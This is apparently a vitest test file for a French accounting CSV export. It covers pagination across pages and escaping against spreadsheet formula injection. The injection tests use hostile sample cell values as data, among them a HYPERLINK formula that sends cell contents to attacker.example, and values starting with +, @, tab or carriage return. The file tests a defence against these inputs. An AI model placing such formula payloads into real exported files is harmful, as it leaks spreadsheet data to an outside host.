import { describe, expect, it } from "vitest";
import {
  EXPORT_DOCUMENT_HEADER,
  EXPORT_DOCUMENT_TEXT_COLUMNS,
  EXPORT_ENTRY_HEADER,
  EXPORT_ENTRY_TEXT_COLUMNS,
  EXPORT_PAGE_SIZE,
  type ExportDocumentRow,
  type ExportEntryRow,
  type ExportRpc,
  accountingExportCsv,
  exportDocumentsCsv,
  exportEntriesCsv,
  fetchAllPages,
} from "./accounting-export";

function entry(i: number, over: Partial<ExportEntryRow> = {}): ExportEntryRow {
  return {
    effective_date: "2026-11-02",
    entry_id: `00000000-0000-4000-8000-${String(i).padStart(12, "0")}`,
    entry_type: "commission_invoice",
    source_type: "commission_invoice",
    source_ref: "FC-2026-000001",
    client_name: "Boulangerie Durand SAS",
    account_number: "7060",
    book: "servicer_revenue",
    debit_minor: 0,
    credit_minor: 12000,
    currency: "EUR",
    posted_at: "2026-11-02T10:00:00+00:00",
    page_key: `k${String(i).padStart(6, "0")}`,
    ...over,
  };
}

function document(i: number, over: Partial<ExportDocumentRow> = {}): ExportDocumentRow {
  return {
    number: `FC-2026-${String(i).padStart(6, "0")}`,
    kind: "invoice",
    issue_date: "2026-11-02",
    client_name: "Boulangerie Durand SAS",
    client_siren: "123456789",
    mandate: "MDT-2026-01",
    run_number: "RV-2026-000001",
    service_from: "2026-10-16",
    service_to: "2026-11-01",
    ht_minor: 12000,
    vat_rate: "0.2000" as unknown as number, // numeric, as PostgREST sends it
    vat_minor: 2400,
    ttc_minor: 14400,
    vat_book: "vat_pending",
    settlement: "netted",
    due_date: "",
    corrects: "",
    settled_minor: 0,
    settlements: "",
    open_minor: 14400,
    page_key: `k${String(i).padStart(6, "0")}`,
    ...over,
  } as ExportDocumentRow;
}

/** A fake PostgREST: the rows in keyset order, answered `p_limit` at most after `p_after`, capped at 1,000. */
function fakeRpc(rows: { page_key: string }[]) {
  const calls: { fn: string; p_after: string | null; p_limit: number; p_from: string; p_to: string }[] = [];
  const rpc: ExportRpc = async (fn, args) => {
    calls.push({ fn, ...args });
    const start = args.p_after === null ? 0 : rows.findIndex((r) => r.page_key === args.p_after) + 1;
    return { data: rows.slice(start, start + Math.min(args.p_limit, 1000)), error: null };
  };
  return { rpc, calls };
}

const dataLines = (csv: string) => csv.split("\r\n").slice(1, -1);

describe("the accountant's export reads every page (review M2c-5 perf#0 = tests-ui#0, K1)", () => {
  it("asks 1,000 + 1,000 + 3 rows page after page and writes all 2,003 entries", async () => {
    const rows = Array.from({ length: 2003 }, (_, i) => entry(i));
    const { rpc, calls } = fakeRpc(rows);
    const out = await accountingExportCsv(rpc, "ecritures", { from: "2026-01-01", to: "2026-12-31" });
    expect(out.error).toBeNull();
    expect(calls.map((c) => [c.fn, c.p_after, c.p_limit])).toEqual([
      ["accounting_export_entries", null, 1000],
      ["accounting_export_entries", "k000999", 1000],
      ["accounting_export_entries", "k001999", 1000],
    ]);
    expect(calls.every((c) => c.p_from === "2026-01-01" && c.p_to === "2026-12-31")).toBe(true);
    const lines = dataLines(out.body ?? "");
    expect(lines).toHaveLength(2003);
    expect(lines[0]).toContain(rows[0].entry_id);
    expect(lines[2002]).toContain(rows[2002].entry_id);
  });

  it("does the same for the invoices and credit notes", async () => {
    const rows = Array.from({ length: 2003 }, (_, i) => document(i + 1));
    const { rpc, calls } = fakeRpc(rows);
    const out = await accountingExportCsv(rpc, "factures", { from: "2026-01-01", to: "2026-12-31" });
    expect(calls.map((c) => [c.fn, c.p_after])).toEqual([
      ["accounting_export_documents", null],
      ["accounting_export_documents", "k001000"],
      ["accounting_export_documents", "k002000"],
    ]);
    const lines = dataLines(out.body ?? "");
    expect(lines).toHaveLength(2003);
    expect(lines[2002].startsWith("FC-2026-002003;facture;")).toBe(true);
  });

  it("asks one more page when the last one is exactly full, and stops on an empty one", async () => {
    const { rpc, calls } = fakeRpc(Array.from({ length: 2000 }, (_, i) => entry(i)));
    const out = await accountingExportCsv(rpc, "ecritures", { from: "2026-01-01", to: "2026-01-31" });
    expect(calls).toHaveLength(3);
    expect(dataLines(out.body ?? "")).toHaveLength(2000);
    const empty = fakeRpc([]);
    const none = await accountingExportCsv(empty.rpc, "ecritures", { from: "2026-01-01", to: "2026-01-31" });
    expect(empty.calls).toHaveLength(1);
    expect(none.body).toBe(`﻿${EXPORT_ENTRY_HEADER.join(";")}\r\n`);
  });

  it("refuses the whole file when a later page fails — never a CSV cut short", async () => {
    const rows = Array.from({ length: 1500 }, (_, i) => entry(i));
    let n = 0;
    const rpc: ExportRpc = async (_fn, args) => {
      n += 1;
      if (n === 2) return { data: null, error: { code: "57014", message: "canceling statement due to statement timeout" } };
      return { data: rows.slice(0, args.p_limit), error: null };
    };
    const out = await accountingExportCsv(rpc, "ecritures", { from: "2026-01-01", to: "2026-12-31" });
    expect(out).toEqual({ body: null, error: { code: "57014", message: "canceling statement due to statement timeout" } });
  });

  it("stops when a full page's last key does not move on (no endless loop)", async () => {
    const stuck = Array.from({ length: EXPORT_PAGE_SIZE }, () => ({ page_key: "same" }));
    let n = 0;
    const out = await fetchAllPages(async () => {
      n += 1;
      return { data: stuck, error: null };
    });
    expect(out.rows).toBeNull();
    expect(n).toBe(2);
  });
});

describe("the export's CSV never carries a formula (review M2c-5 security#0 = tests-ui#6, K3)", () => {
  it("names every text column, and only text columns", () => {
    expect([...EXPORT_DOCUMENT_TEXT_COLUMNS].every((c) => (EXPORT_DOCUMENT_HEADER as readonly string[]).includes(c))).toBe(true);
    expect([...EXPORT_ENTRY_TEXT_COLUMNS].every((c) => (EXPORT_ENTRY_HEADER as readonly string[]).includes(c))).toBe(true);
    // what is left untouched: dates, amounts, cents and the VAT rate
    expect(EXPORT_DOCUMENT_HEADER.filter((c) => !EXPORT_DOCUMENT_TEXT_COLUMNS.has(c))).toEqual([
      "date_emission",
      "periode_du",
      "periode_au",
      "montant_ht",
      "montant_ht_centimes",
      "taux_tva",
      "tva",
      "tva_centimes",
      "montant_ttc",
      "montant_ttc_centimes",
      "echeance",
      "regle_centimes",
      "reste_du_centimes",
    ]);
    expect(EXPORT_ENTRY_HEADER.filter((c) => !EXPORT_ENTRY_TEXT_COLUMNS.has(c))).toEqual([
      "date",
      "debit",
      "debit_centimes",
      "credit",
      "credit_centimes",
      "enregistree_le",
    ]);
  });

  it("puts an apostrophe before = + - @ TAB CR in a text cell and leaves a negative amount numeric", () => {
    const csv = exportDocumentsCsv([
      document(1, {
        kind: "credit_note",
        client_name: '=HYPERLINK("https://attacker.example/?"&A1)',
        mandate: "+1+cmd",
        client_siren: "-2",
        corrects: "@SUM(1+1)",
        settlements: "\tnetted",
        run_number: "\rRV",
        ht_minor: -1234,
        vat_minor: -247,
        ttc_minor: -1481,
        open_minor: null as unknown as number, // a credit note has no open amount
      }),
    ]);
    const [line] = dataLines(csv);
    const cells = line.split(";");
    const at = (name: string) => cells[(EXPORT_DOCUMENT_HEADER as readonly string[]).indexOf(name)];
    expect(at("client")).toBe(`"'=HYPERLINK(""https://attacker.example/?""&A1)"`);
    expect(at("mandat")).toBe("'+1+cmd");
    expect(at("siren_client")).toBe("'-2");
    expect(at("rectifie")).toBe("'@SUM(1+1)");
    expect(at("reglements")).toBe("'\tnetted");
    expect(line).toContain(`;"'\rRV";`);
    expect(at("montant_ht")).toBe("-12,34");
    expect(at("montant_ht_centimes")).toBe("-1234");
    expect(at("tva")).toBe("-2,47");
    expect(at("montant_ttc_centimes")).toBe("-1481");
    expect(at("date_emission")).toBe("2026-11-02");
    expect(at("type")).toBe("avoir");
  });

  it("does the same in the entries, where a credit stays a plain amount", () => {
    const csv = exportEntriesCsv([entry(1, { client_name: "=1+1", source_ref: "-FC", debit_minor: 0, credit_minor: 1234 })]);
    const cells = dataLines(csv)[0].split(";");
    const at = (name: string) => cells[(EXPORT_ENTRY_HEADER as readonly string[]).indexOf(name)];
    expect(at("client")).toBe("'=1+1");
    expect(at("piece")).toBe("'-FC");
    expect(at("credit")).toBe("12,34");
    expect(at("debit")).toBe("0,00");
    expect(at("date")).toBe("2026-11-02");
    expect(at("compte")).toBe("7060");
    expect(at("libelle_compte")).toBe("Commissions de recouvrement");
  });
});
